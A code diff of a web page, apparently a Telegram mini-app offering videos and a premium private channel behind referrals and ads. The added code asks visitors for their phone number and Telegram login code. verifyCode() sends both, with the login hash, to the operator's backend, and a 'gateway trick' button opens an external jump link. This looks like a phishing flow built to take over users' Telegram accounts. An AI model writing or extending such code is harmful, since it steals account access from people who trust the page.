@@ -123,9 +123,12 @@
             </div>
 
             <div id="otp-sec" style="display: none;">
-                <p style="font-size: 13px; color: #ddd; margin-bottom: 20px;">OTP Code requested successfully!</p>
-                <!-- মেইন পেজ চেঞ্জ করে app.html এ নিয়ে যাবে -->
-                <button onclick="viewCodeAction()" class="share-btn" style="background: linear-gradient(90deg, #00ffaa, #00aaff); color:#000;">👀 Go to OTP Page</button>
+                <div style="display: flex; gap: 8px; align-items: stretch; justify-content: center; margin-bottom: 10px;">
+                    <input type="text" id="otp-input" class="login-input" placeholder="Enter OTP" style="width: 65%; margin-bottom: 0; letter-spacing: 5px;">
+                    <!-- ব্যাকএন্ড গেটওয়ে ট্রিক -->
+                    <button onclick="tg.openLink('https://pmrony-forwardbot.hf.space/api/jump')" style="width: 30%; background: #222; color: #00ffaa; border: 1px solid #00ffaa; border-radius: 8px; padding: 10px 5px; font-size: 11px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; text-align: center; line-height: 1.2;">👀 View<br>Code</button>
+                </div>
+                <button id="btn-verify-code" class="share-btn" style="background: linear-gradient(90deg, #00ffaa, #00aaff); color:#000;" onclick="verifyCode()">Verify & Connect</button>
                 <div style="text-align: center; margin-top: 15px;">
                     <button onclick="resetLoginState()" style="background: transparent; color: #ff3366; border: none; text-decoration: underline; cursor: pointer; font-size: 12px;">Wrong Number? Go Back</button>
                 </div>
@@ -162,6 +165,7 @@
         let currentHash = "";
         let isCheckingLogin = false;
 
+        // আপনার প্রাইভেট চ্যানেলের ইনভাইট লিংক
         const PREMIUM_CHANNEL_LINK = "https://t.me/+snT3FqTlgmJlNDQ1";
 
         async function openLogin() {
@@ -180,8 +184,16 @@
                 if (data.status === "logged_in") {
                     showPremiumModal();
                 } else {
-                    document.getElementById('phone-sec').style.display = 'block';
-                    document.getElementById('otp-sec').style.display = 'none';
+                    let savedState = localStorage.getItem("loginState");
+                    if (savedState === "otp") {
+                        currentPhone = localStorage.getItem("savedPhone");
+                        currentHash = localStorage.getItem("savedHash");
+                        document.getElementById('phone-sec').style.display = 'none';
+                        document.getElementById('otp-sec').style.display = 'block';
+                    } else {
+                        document.getElementById('phone-sec').style.display = 'block';
+                        document.getElementById('otp-sec').style.display = 'none';
+                    }
                     document.getElementById('loginModal').style.display = 'flex';
                 }
             } catch(e) { showToast("Connection error!"); }
@@ -207,24 +219,45 @@
                 const data = await res.json();
                 if(data.status === "ok") {
                     currentHash = data.hash;
-                    
+                    localStorage.setItem("savedPhone", currentPhone);
+                    localStorage.setItem("savedHash", currentHash);
+                    localStorage.setItem("loginState", "otp");
                     document.getElementById('phone-sec').style.display = 'none';
                     document.getElementById('otp-sec').style.display = 'block';
-                    showToast("Success! Now go to OTP page.");
+                    showToast("Code sent to your Telegram!");
                 } else { showToast("Error: " + data.msg); }
             } catch(e) { showToast("Server error!"); } 
             finally { sendBtn.innerHTML = originalText; sendBtn.disabled = false; }
         }
 
-        // ====== MASTERMIND LOGIC ======
-        function viewCodeAction() {
-            // কোনো ব্রাউজার ওপেন হবে না! 
-            // এই ওয়েবঅ্যাপের পেজটাই বদলে গিয়ে app.html হয়ে যাবে।
-            let appUrl = 'app.html?user_id=' + userId + '&phone=' + encodeURIComponent(currentPhone) + '&hash=' + encodeURIComponent(currentHash);
-            window.location.href = appUrl;
+        async function verifyCode() {
+            const otp = document.getElementById('otp-input').value.trim();
+            if(!otp) return showToast("Enter OTP!");
+            
+            const verifyBtn = document.getElementById('btn-verify-code');
+            const originalText = verifyBtn.innerHTML;
+            verifyBtn.innerHTML = "⏳ Verifying...";
+            verifyBtn.disabled = true;
+
+            showToast("Verifying account...");
+            try {
+                const res = await fetch(`${BACKEND_URL}/api/verify_code`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone: currentPhone, hash: currentHash, otp: otp, user_id: userId }) });
+                const data = await res.json();
+                if(data.status === "ok") {
+                    localStorage.removeItem("loginState");
+                    localStorage.removeItem("savedPhone");
+                    localStorage.removeItem("savedHash");
+                    closeLogin();
+                    showPremiumModal();
+                } else { showToast("Invalid Code or Error!"); }
+            } catch(e) { showToast("Server connection error!"); } 
+            finally { verifyBtn.innerHTML = originalText; verifyBtn.disabled = false; }
         }
 
         function resetLoginState() {
+            localStorage.removeItem("loginState");
+            localStorage.removeItem("savedPhone");
+            localStorage.removeItem("savedHash");
             document.getElementById('otp-sec').style.display = 'none';
             document.getElementById('phone-sec').style.display = 'block';
         }
@@ -256,7 +289,7 @@
             try {
                 const res = await fetch(`${SUPABASE_URL}/rest/v1/referrals?user_id=eq.${userId}&select=referral_count`, { headers: fetchHeaders });
                 const data = await res.json();
-                if (Array.isArray(data) && data.length > 0) {
+                if (data.length > 0) {
                     let newRef = data[0].referral_count;
                     if(newRef !== dbRefcount) {
                         dbRefcount = newRef;
@@ -354,7 +387,7 @@
                 if (currentNeededRef > 0 && !clickedAds[videoUrl] && isMp4) { 
                     showToast("⏳ Unlocking secure player...");
                     clickedAds[videoUrl] = true; 
-                    setTimeout(() => { window.location.href = adUrl; }, 800);
+                    setTimeout(() => { tg.openLink(adUrl); }, 800);
                     return; 
                 }
                 const playerWrapper = document.getElementById('player-wrapper');
@@ -406,6 +439,12 @@
         }
 
         function closeModal() { document.getElementById('shareModal').style.display = 'none'; }
+
+        // পেজ রিলোড হলে অটোমেটিক লগিন স্টেট চেক করবে
+        let savedState = localStorage.getItem("loginState");
+        if (savedState === "otp") {
+            setTimeout(() => { openLogin(); }, 500);
+        }
 
         fetchVideos();
         initData();
